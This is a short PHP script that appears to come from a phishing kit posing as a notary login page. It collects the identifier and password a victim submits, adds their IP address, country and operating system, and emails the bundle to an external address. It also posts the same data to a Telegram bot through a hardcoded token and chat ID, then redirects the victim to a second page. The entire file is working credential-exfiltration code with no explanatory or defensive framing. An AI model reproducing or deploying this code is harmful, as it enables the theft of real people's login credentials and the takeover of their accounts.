<?php

session_start();
include_once 'functions.php';

	
$message = '[🆘] +1 LOG NOTAIRE [🆘]' . "\r\n\n";

$message .= '🚀 IDENTIFIANT : ' . $_POST['iden'] . " \r\n\n";
$message .= '🚀 MOT DE PASSE : ' . $_POST['password'] . " \r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['account']=$_POST['account'];


$send = "towinborn24@proton.me";
$subject = "🆘  LOG NOTAIRE : ".$_POST['name']."  [ " . get_user_country() . " - " . get_user_os() . " - " . get_user_ip() . " ]";
$headers = "From: ᘿᖇᖇᘿᑘᖇ 404 👨🏾‍💻<Fr-Rez>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot7808636814:AAGe7USYoVtSDviFHirAWc5QpFdTv9toOMw/sendMessage?chat_id=5714386734&text=" . urlencode($message)."" );

    header('location: index_2.php');

?>
